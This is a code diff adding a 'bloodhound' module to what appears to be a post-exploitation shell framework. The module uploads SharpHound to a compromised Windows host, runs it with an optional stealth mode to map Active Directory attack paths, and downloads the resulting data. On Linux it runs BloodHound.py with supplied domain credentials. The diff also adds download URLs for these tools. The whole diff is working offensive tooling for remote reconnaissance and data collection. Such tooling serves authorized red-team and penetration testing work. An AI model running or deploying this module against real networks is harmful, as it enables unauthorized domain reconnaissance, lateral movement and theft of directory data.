@@ -5394,6 +5394,252 @@ class linux_procmemdump(Module):
 			logger.error("This module runs only on Unix shells")
 
 
+class bloodhound(Module):
+	category = "Pivoting"
+	def run(session, args):
+		"""
+		Collect Active Directory data using BloodHound (SharpHound/BloodHound.py)
+
+		BloodHound is used to reveal hidden relationships and attack paths in
+		Active Directory environments. This module automates data collection.
+
+		Usage:
+		  run bloodhound                              # Collect all data (default)
+		  run bloodhound -d domain.local              # Specify domain
+		  run bloodhound -c DCOnly                    # Domain Controllers only
+		  run bloodhound -c Session,Group,LocalAdmin  # Custom collection methods
+		  run bloodhound --stealth                    # Stealth mode (fewer queries)
+
+		Collection Methods:
+		  All          - Collect everything (default, comprehensive)
+		  DCOnly       - Domain Controllers only (quick, less noisy)
+		  Session      - User sessions on computers
+		  Group        - Group memberships
+		  LocalAdmin   - Local admin rights
+		  GPOLocalGroup - Group Policy local groups
+		  Trusts       - Domain trusts
+		  ACL          - Access Control Lists
+		  Container    - Container objects
+		  RDP          - RDP sessions
+		  DCOM         - DCOM rights
+		  PSRemote     - PSRemote rights
+
+		Windows (SharpHound):
+		  • Automatically selects x86 or x64 version based on architecture
+		  • Runs in memory, collects data, creates ZIP file
+		  • Downloads ZIP to local machine automatically
+		  • Supports all collection methods
+
+		Linux (BloodHound.py):
+		  • Requires Python 3 and impacket library on target
+		  • Needs domain credentials (current user or specified)
+		  • Remote enumeration via LDAP/SMB
+		  • Note: BloodHound.py requires pip install bloodhound
+
+		Examples:
+		  run bloodhound                        # Full collection (All)
+		  run bloodhound -d corp.local          # Specify domain
+		  run bloodhound -c DCOnly              # Quick DC scan
+		  run bloodhound -c Session,Group       # Sessions and groups only
+		  run bloodhound --stealth              # Stealth collection
+		  run bloodhound -d corp.local -u user -p pass  # With credentials (Linux)
+
+		Output:
+		  • ZIP file downloaded to current session directory
+		  • Import into BloodHound GUI for analysis
+		  • Default filename: <date>_BloodHound.zip
+
+		Options:
+		  -d, --domain DOMAIN       Target domain (auto-detected if not specified)
+		  -c, --collectionmethod    Collection method(s) (default: All)
+		  -u, --username USER       Username for authentication (Linux only)
+		  -p, --password PASS       Password for authentication (Linux only)
+		  --stealth                 Use stealth collection methods
+		  --zipfilename NAME        Custom output ZIP filename
+
+		Note: Requires appropriate privileges. Domain user for basic enumeration,
+		      elevated privileges for complete data collection.
+		"""
+		import argparse
+		parser = argparse.ArgumentParser(prog='bloodhound', add_help=False)
+		parser.add_argument('-d', '--domain', help='Target domain')
+		parser.add_argument('-c', '--collectionmethod', default='All', help='Collection methods (default: All)')
+		parser.add_argument('-u', '--username', help='Username (Linux/BloodHound.py only)')
+		parser.add_argument('-p', '--password', help='Password (Linux/BloodHound.py only)')
+		parser.add_argument('--stealth', action='store_true', help='Stealth mode')
+		parser.add_argument('--zipfilename', help='Output ZIP filename')
+
+		try:
+			parsed_args = parser.parse_args(args.split() if args else [])
+		except SystemExit:
+			return
+
+		if session.OS == 'Windows':
+			logger.info("Running SharpHound on Windows...")
+
+			# Select SharpHound based on architecture
+			if session.arch == 'x64':
+				sharphound_url = URLS['sharphound_x64']
+				logger.info("Using SharpHound x64")
+			else:
+				sharphound_url = URLS['sharphound_x86']
+				logger.info("Using SharpHound x86")
+
+			# Upload SharpHound
+			logger.info("Uploading SharpHound...")
+			uploaded = session.upload(sharphound_url, remote_path=session.tmp)
+			if not uploaded:
+				logger.error("Failed to upload SharpHound")
+				return False
+
+			sharphound_zip = uploaded[0]
+
+			# Extract SharpHound
+			logger.info("Extracting SharpHound...")
+			if session.subtype == 'psh':
+				extract_cmd = f"Expand-Archive -Path '{sharphound_zip}' -DestinationPath '{session.tmp}' -Force"
+			else:
+				# Try to use PowerShell from cmd
+				extract_cmd = f'powershell -c "Expand-Archive -Path \'{sharphound_zip}\' -DestinationPath \'{session.tmp}\' -Force"'
+
+			result = session.exec(extract_cmd, value=True)
+			if result and 'error' in result.lower():
+				logger.error(f"Failed to extract SharpHound: {result}")
+				return False
+
+			# Find SharpHound.exe
+			sharphound_exe = f"{session.tmp}\\SharpHound.exe"
+
+			# Build command
+			cmd_parts = [sharphound_exe]
+			cmd_parts.append(f"--CollectionMethods {parsed_args.collectionmethod}")
+
+			if parsed_args.domain:
+				cmd_parts.append(f"--Domain {parsed_args.domain}")
+
+			if parsed_args.stealth:
+				cmd_parts.append("--Stealth")
+
+			if parsed_args.zipfilename:
+				cmd_parts.append(f"--ZipFileName {parsed_args.zipfilename}")
+			else:
+				cmd_parts.append(f"--OutputDirectory {session.tmp}")
+
+			cmd = ' '.join(cmd_parts)
+
+			logger.info(f"Running SharpHound with collection method: {parsed_args.collectionmethod}")
+			logger.info("This may take several minutes depending on domain size...")
+
+			# Execute SharpHound
+			output = session.exec(cmd, value=True)
+			if output:
+				print(output)
+
+			# Find and download the output ZIP
+			logger.info("Searching for output ZIP file...")
+			if session.subtype == 'psh':
+				find_cmd = f"Get-ChildItem -Path '{session.tmp}' -Filter '*BloodHound*.zip' | Select-Object -First 1 -ExpandProperty FullName"
+			else:
+				find_cmd = f'dir /b /s "{session.tmp}\\*BloodHound*.zip"'
+
+			zip_path = session.exec(find_cmd, value=True)
+			if zip_path:
+				zip_path = zip_path.strip().split('\n')[0].strip()
+				logger.info(f"Found: {zip_path}")
+				logger.info("Downloading BloodHound data...")
+				session.download(zip_path)
+				logger.info("BloodHound collection completed successfully!")
+			else:
+				logger.error("Could not find output ZIP file")
+				# List files in temp directory for debugging
+				logger.info("Files in temp directory:")
+				if session.subtype == 'psh':
+					list_cmd = f"Get-ChildItem -Path '{session.tmp}' | Select-Object Name"
+				else:
+					list_cmd = f'dir "{session.tmp}"'
+				print(session.exec(list_cmd, value=True))
+
+		elif session.OS == 'Unix':
+			logger.info("Running BloodHound.py on Linux...")
+
+			# Check for Python 3
+			if not session.bin.get('python3'):
+				logger.error("Python 3 not found on target system")
+				logger.info("BloodHound.py requires Python 3 and the bloodhound library")
+				return False
+
+			# Check if bloodhound is installed
+			check_cmd = f"{session.bin['python3']} -c 'import bloodhound' 2>&1"
+			result = session.exec(check_cmd, value=True)
+
+			if 'No module named' in result or 'ModuleNotFoundError' in result:
+				logger.error("BloodHound Python library not installed on target")
+				logger.info("Install with: pip3 install bloodhound")
+				logger.info("Alternative: Use SharpHound from a Windows machine")
+				return False
+
+			logger.info("BloodHound library found")
+
+			# Build command
+			cmd_parts = [session.bin['python3'], '-m', 'bloodhound']
+
+			if parsed_args.domain:
+				cmd_parts.extend(['-d', parsed_args.domain])
+			else:
+				logger.error("Domain name is required for BloodHound.py")
+				logger.info("Usage: run bloodhound -d domain.local -u username -p password")
+				return False
+
+			if parsed_args.username:
+				cmd_parts.extend(['-u', parsed_args.username])
+			else:
+				logger.warning("No username specified, will try to use current credentials")
+
+			if parsed_args.password:
+				cmd_parts.extend(['-p', parsed_args.password])
+
+			cmd_parts.extend(['-c', parsed_args.collectionmethod])
+
+			# Set output directory
+			cmd_parts.extend(['--zip'])
+
+			cmd = ' '.join(cmd_parts)
+
+			logger.info(f"Running BloodHound.py with collection method: {parsed_args.collectionmethod}")
+			logger.info("This may take several minutes...")
+
+			# Execute BloodHound.py
+			output = session.exec(cmd, value=True)
+			if output:
+				print(output)
+
+			# Find and download output ZIP
+			logger.info("Searching for output files...")
+			find_cmd = "find . -maxdepth 1 -name '*bloodhound*.zip' -o -name '*BloodHound*.zip' 2>/dev/null | head -1"
+			zip_path = session.exec(find_cmd, value=True)
+
+			if zip_path and zip_path.strip():
+				zip_path = zip_path.strip()
+				logger.info(f"Found: {zip_path}")
+				logger.info("Downloading BloodHound data...")
+				session.download(zip_path)
+				logger.info("BloodHound collection completed successfully!")
+			else:
+				logger.warning("Could not find output ZIP file")
+				logger.info("Searching for JSON files...")
+				json_cmd = "ls -la *.json 2>/dev/null"
+				json_files = session.exec(json_cmd, value=True)
+				if json_files:
+					logger.info("Found JSON files:")
+					print(json_files)
+					logger.info("Downloading JSON files...")
+					session.download("*.json")
+				else:
+					logger.error("No output files found")
+		else:
+			logger.error("Unsupported OS")
+
+
 class FileServer:
 	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False):
 		self.port = port or options.default_fileserver_port
@@ -6057,6 +6303,9 @@ URLS = {
 	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
 	'uac_linux':  	"https://github.com/tclahr/uac/releases/download/v3.1.0/uac-3.1.0.tar.gz",
 	'linux_procmemdump':  	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
+	'sharphound_x86': "https://github.com/SpecterOps/SharpHound/releases/download/v2.7.2/SharpHound_v2.7.2_windows_x86.zip",
+	'sharphound_x64': "https://github.com/SpecterOps/SharpHound/releases/download/v2.7.2/SharpHound_v2.7.2_windows_x64.zip",
+	'bloodhound_py': "https://raw.githubusercontent.com/dirkjanm/BloodHound.py/master/bloodhound.py",
 }
 
 # Python Agent code
